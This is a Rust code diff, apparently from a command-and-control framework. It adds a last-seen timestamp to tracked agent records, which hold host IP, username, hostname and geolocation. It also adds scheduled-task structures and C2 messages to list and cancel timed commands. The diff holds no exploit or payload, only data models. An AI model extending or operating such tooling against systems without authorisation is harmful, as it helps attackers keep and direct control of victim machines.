@@ -1,7 +1,9 @@
+use chrono::{DateTime, Utc};
 use serde::{Deserialize, Serialize};
 use std::fmt;
+use sqlx::FromRow;
 
-#[derive(Debug, Serialize, Deserialize, sqlx::FromRow, Clone)]
+#[derive(Debug, Serialize, Deserialize, FromRow, Clone)]
 pub struct Agent {
     pub id: Option<i32>,
     pub uuid: String,
@@ -14,18 +16,20 @@ pub struct Agent {
     pub latitude: f64,
     pub longitude: f64,
     pub online: bool,
+    pub last_seen: DateTime<Utc>,
 }
 
 impl fmt::Display for Agent {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         write!(
             f,
-            "\nAgent UUID: {}\nIP: {}\nUsername: {}\nHostname: {}\nOnline: {}\nCountry: {}\nCity: {}\nRegion: {}\nLatitude: {}\nLongitude: {}",
+            "\nAgent UUID: {}\nIP: {}\nUsername: {}\nHostname: {}\nOnline: {}\nLast Seen: {}\nCountry: {}\nCity: {}\nRegion: {}\nLatitude: {}\nLongitude: {}",
             self.uuid,
             self.ip,
             self.username,
             self.hostname,
             self.online,
+            self.last_seen.to_rfc3339(),
             self.country,
             self.city,
             self.region,
@@ -33,6 +37,16 @@ impl fmt::Display for Agent {
             self.longitude,
         )
     }
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize, FromRow)]
+pub struct ScheduledTask {
+    pub id: i32,
+    pub command_type: String,
+    pub args: serde_json::Value,
+    #[serde(with = "chrono::serde::ts_seconds")]
+    pub execute_at: DateTime<Utc>,
+    pub executed: bool,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -115,6 +129,17 @@ pub enum C2Message {
         token: String,
     },
     AuthResponse {
+        success: bool,
+        message: String,
+    },
+    RequestScheduledTasks {
+        show_all: bool,
+    },
+    ScheduledTasks { tasks: Vec<ScheduledTask> },
+    CancelScheduledTask {
+        task_id: i32,
+    },
+    CancelTaskResponse {
         success: bool,
         message: String,
     },
